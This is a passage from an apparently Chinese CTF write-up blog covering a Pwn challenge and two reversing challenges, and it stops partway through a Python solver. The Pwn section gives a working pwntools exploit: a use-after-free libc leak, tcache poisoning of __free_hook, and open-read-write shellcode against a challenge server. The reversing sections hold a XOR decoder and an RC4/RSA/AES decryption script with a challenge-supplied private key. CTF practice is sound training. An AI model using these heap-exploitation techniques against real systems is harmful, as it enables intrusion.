<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="rcms"><a href="#rcms" class="headerlink" title="rcms"></a>rcms</h3><p>uaf，试出来libc是2.27，unsorted bin leak泄露libc，tcachebin attack分配到存储后门函数的chunk，泄露后门函数地址，再tcachebin attack改__free_hook为后门函数</p>
<p>最后写orw即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># from LibcSearcher import LibcSearcher</span><br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment"># context.terminal=[&quot;cmd.exe&quot;,&quot;/c&quot;, &quot;start&quot;, &quot;cmd.exe&quot;, &quot;/c&quot;, &quot;wsl.exe&quot;, &quot;-e&quot;]</span><br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/home/yui/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">index, size, data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    创建堆块 - 对应 create_connection() @ 0xbe9</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    参数:</span><br><span class="hljs-string">        index: 堆块索引 (0-20)</span><br><span class="hljs-string">        size: 堆块大小 (0 &lt; size &lt;= 0x430)</span><br><span class="hljs-string">        data: 要写入的数据</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    IDA分析:</span><br><span class="hljs-string">        - 检查索引范围: 0 &lt;= index &lt;= 20</span><br><span class="hljs-string">        - 检查大小范围: 0 &lt; size &lt;= 0x430</span><br><span class="hljs-string">        - 调用 malloc(size) 分配堆块</span><br><span class="hljs-string">        - 将指针存入 heap_ptr_array[index] @ 0x202040</span><br><span class="hljs-string">        - 将大小存入 heap_size_array[index] @ 0x2020e0</span><br><span class="hljs-string">        - 读取用户输入到堆块</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    p.sendlineafter(<span class="hljs-string">b&#x27;5.exit\n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;connect:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;want:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;cmd:&#x27;</span>, data)<br>    log.info(<span class="hljs-string">f&quot;[+] create(index=<span class="hljs-subst">&#123;index&#125;</span>, size=<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(size)&#125;</span>, len(data)=<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(data)&#125;</span>)&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    删除堆块 - 对应 delete_connection_UAF() @ 0xd6d</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    参数:</span><br><span class="hljs-string">        index: 要删除的堆块索引</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    ⚠️  UAF漏洞点！</span><br><span class="hljs-string">    IDA分析:</span><br><span class="hljs-string">        - 调用 free(heap_ptr_array[index]) @ 0xe05</span><br><span class="hljs-string">        - 漏洞: free后未清空 heap_ptr_array[index] 指针</span><br><span class="hljs-string">        - 漏洞: 未清空 heap_size_array[index]</span><br><span class="hljs-string">        - 导致可以继续通过 change/show 访问已释放内存</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    p.sendlineafter(<span class="hljs-string">b&#x27;5.exit\n&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;delet:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    log.warning(<span class="hljs-string">f&quot;[!] delete(index=<span class="hljs-subst">&#123;index&#125;</span>) - UAF漏洞点！指针未清空&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">index, data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    修改堆块 - 对应 change_connection() @ 0xe2d</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    参数:</span><br><span class="hljs-string">        index: 堆块索引</span><br><span class="hljs-string">        data: 新数据</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    UAF利用:</span><br><span class="hljs-string">        - 可以修改已释放的堆块 (UAF写入)</span><br><span class="hljs-string">        - 可以覆写 tcache/fastbin 的 fd 指针</span><br><span class="hljs-string">        - 可以伪造堆块结构</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    IDA分析:</span><br><span class="hljs-string">        - 读取 heap_size_array[index] 字节到 heap_ptr_array[index]</span><br><span class="hljs-string">        - 未检查堆块是否已释放</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    p.sendlineafter(<span class="hljs-string">b&#x27;5.exit\n&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;change:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;cmd:&#x27;</span>, data)<br>    log.info(<span class="hljs-string">f&quot;[+] change(index=<span class="hljs-subst">&#123;index&#125;</span>, len(data)=<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(data)&#125;</span>)&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    显示堆块 - 对应 show_connection() @ 0xf18</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    参数:</span><br><span class="hljs-string">        index: 堆块索引</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    UAF利用:</span><br><span class="hljs-string">        - 可以读取已释放堆块的内容 (UAF读取)</span><br><span class="hljs-string">        - 释放到 unsorted bin 后，fd/bk 指向 main_arena</span><br><span class="hljs-string">        - 可以泄露 libc 基址</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    IDA分析:</span><br><span class="hljs-string">        - 调用 puts(heap_ptr_array[index]) @ 0xfb0</span><br><span class="hljs-string">        - 未检查堆块是否已释放</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    p.sendlineafter(<span class="hljs-string">b&#x27;5.exit\n&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;show:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    log.info(<span class="hljs-string">f&quot;[+] show(index=<span class="hljs-subst">&#123;index&#125;</span>)&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size, data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;add() 是 create() 的别名&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> create(index, size, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;free() 是 delete() 的别名&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> delete(index)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;edit() 是 change() 的别名&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> change(index, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;view() 是 show() 的别名&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> show(index)<br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>, <span class="hljs-number">26439</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    free(i)<br><br>free(<span class="hljs-number">6</span>)<br>show(<span class="hljs-number">6</span>)<br>p.recvline()<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;protected&#x27;</span>)<br>free(<span class="hljs-number">7</span>)<br>show(<span class="hljs-number">7</span>)<br>p.recvline()<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">f&quot;[+] Leaked heap address: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap_addr)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;[+] Leaked main_arena: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(leak)&#125;</span>&quot;</span>)<br><br>libc_base = leak - <span class="hljs-number">0x3ebc40</span> - <span class="hljs-number">96</span><br>log.success(<span class="hljs-string">f&quot;[+] libc_base: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br><br>__free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>log.info(<span class="hljs-string">f&quot;[+] __free_hook: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(__free_hook)&#125;</span>&quot;</span>)<br><br>message = <span class="hljs-string">&quot;======================== TCACHE ATTACK ======================&quot;</span><br>success(message)<br>backdoor = heap_addr - <span class="hljs-number">0x1310</span><br><span class="hljs-comment"># edit(5, p64(backdoor))</span><br><span class="hljs-comment"># show(5)</span><br><span class="hljs-comment"># p.recvline()</span><br>edit(<span class="hljs-number">6</span>, p64(backdoor))<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;hacker&#x27;</span>)<br><br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">10</span>)<br>p.recvline()<br>gift = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x61</span> + <span class="hljs-number">0xd8</span><br>log.success(<span class="hljs-string">f&quot;[+] backdoor address: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(gift)&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">11</span>+i, <span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-comment"># add(18, 0x100, &#x27;b&#x27;)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    free(<span class="hljs-number">11</span>+i)<br><br>edit(<span class="hljs-number">11</span>+<span class="hljs-number">5</span>, p64(__free_hook))<br>add(<span class="hljs-number">18</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;hacker&#x27;</span>)<br>add(<span class="hljs-number">19</span>, <span class="hljs-number">0x100</span>, p64(gift))<br><span class="hljs-comment"># debug()</span><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* open(&quot;./flag&quot;, O_RDONLY, 0) */</span><br><span class="hljs-string">    push 0x67616c66</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    /* read(fd, 0x10500, 0x100) */</span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    mov rsi, 0x10500</span><br><span class="hljs-string">    mov rdx, 0x100</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    /* write(1, 0x10500, rax) */</span><br><span class="hljs-string">    mov rdx, rax</span><br><span class="hljs-string">    mov rsi, 0x10500</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>log.info(<span class="hljs-string">f&quot;[+] Shellcode length: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(shellcode)&#125;</span> bytes&quot;</span>)<br>log.info(<span class="hljs-string">f&quot;[+] Shellcode (hex): <span class="hljs-subst">&#123;shellcode.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>free(<span class="hljs-number">2</span>)<br>sleep(<span class="hljs-number">0.1</span>)<br><br>p.sendline(shellcode)<br><br>sleep(<span class="hljs-number">0.2</span>)<br><br><span class="hljs-comment"># debug()</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="Ezmac"><a href="#Ezmac" class="headerlink" title="Ezmac"></a>Ezmac</h3><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512070925083.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">char</span> p[]=&#123;<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x7B</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x7F</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x7B</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x7A</span>,<span class="hljs-number">0x2E</span>,<span class="hljs-number">0x2D</span>,<span class="hljs-number">0x7F</span>,<span class="hljs-number">0x2D</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">24</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, p[i]^(<span class="hljs-number">57</span>+i));<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="androidfile"><a href="#androidfile" class="headerlink" title="androidfile"></a>androidfile</h3><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512070925185.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">CTF Challenge: Android Crypto Challenge Solver</span><br><span class="hljs-string"></span><br><span class="hljs-string">正确的加密流程:</span><br><span class="hljs-string">1. 生成AES key和iv (16字符随机)</span><br><span class="hljs-string">2. RSA加密key和iv，格式化为 &quot;enkey_&lt;RSA(key)&gt;\neniv_&lt;RSA(iv)&gt;&quot;</span><br><span class="hljs-string">3. RC4(&quot;REVERSE&quot;) + Base64 对上述格式化字符串加密</span><br><span class="hljs-string">4. AES/CBC加密用户输入（flag），然后Base64</span><br><span class="hljs-string">5. 数据包格式: &lt;RC4+B64(enkey_...\neniv_...)&gt;&lt;-encryptinput-&gt;&lt;AES密文B64&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">解密流程:</span><br><span class="hljs-string">1. 分割数据包</span><br><span class="hljs-string">2. Base64解码第一部分 -&gt; RC4解密 -&gt; 提取RSA密文</span><br><span class="hljs-string">3. RSA解密得到AES key和iv</span><br><span class="hljs-string">4. Base64解码第二部分 -&gt; AES/CBC解密 -&gt; 得到flag</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES, PKCS1_v1_5<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># RSA private key</span><br>RSA_PRIVATE_KEY = <span class="hljs-string">&quot;&quot;&quot;-----BEGIN PRIVATE KEY-----</span><br><span class="hljs-string">MIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEAncB8BH4egqfyJBoV</span><br><span class="hljs-string">PzGNIuQl/64e5fl1If+CwtICWoiRV4AMfHuiREB+XlTawJ7QD/ZJj2wO6sY4sdNh</span><br><span class="hljs-string">yYcC4QIDAQABAkEAh81Gdg+kcFHoD9AsbkRX/atuUtcwXkYL4gK2LMThpdEFHIO7</span><br><span class="hljs-string">Scr+SYfwqmm/LMtkbojEGEnNoIfmoLvGfhXaAQIhANDWo8OSMSQFnvh129cFiVfY</span><br><span class="hljs-string">KlS4ec24ixvFD8fUD4SRAiEAwWBuZ3kox1n21AsTAxom+E3z5KUUOSUjPXvG6tZB</span><br><span class="hljs-string">gVECIDOP2y0tSi6/qIll6BqFxmxG9eSnC4PMfaQkmonXBOHRAiBmJUPsUGmj8/eX</span><br><span class="hljs-string">xknCp7vSCYs9SZ3HGcDlp05Jmed8IQIhAJnE1PNe9lC5OazgRYhSG6bGCTbfFHT6</span><br><span class="hljs-string">OuwCVIxRSx4P</span><br><span class="hljs-string">-----END PRIVATE KEY-----&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 截获的加密数据</span><br>FULL_DATA = <span class="hljs-string">&quot;EvB2udc3ofALSbCxeH5j4O2QZjfyZ151Nj3tOBVpt+99XXudbbzYknID0CxFcVO5+Vf16SjxzVbCuOizTIm3TVXXprsM1IlyjzJnTIUc8s4cFIX+clb1zN5PqUm11Z9LDlUMGYu+fa0fZqB5o7EMXWJvl+uKOsk/K3zzrnU0Rdpn/Ylm0ZBBDqpaNDYeXkGM52Uj6NxOhRRMaW2VcH/u4rNg7y7/X6OKa68G2TstGohwelnKpzgp4eFBNxn2&lt;-encryptinput-&gt;UBUSWb+1P3Z/aokV67e5xQ7eaHoEj3JAeC0XA1RckTWdWZYCB/+D7qC3Hao74goX&quot;</span><br><br>RC4_KEY = <span class="hljs-string">b&quot;REVERSE&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_crypt</span>(<span class="hljs-params">key, data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;RC4 encryption/decryption&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># KSA</span><br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % 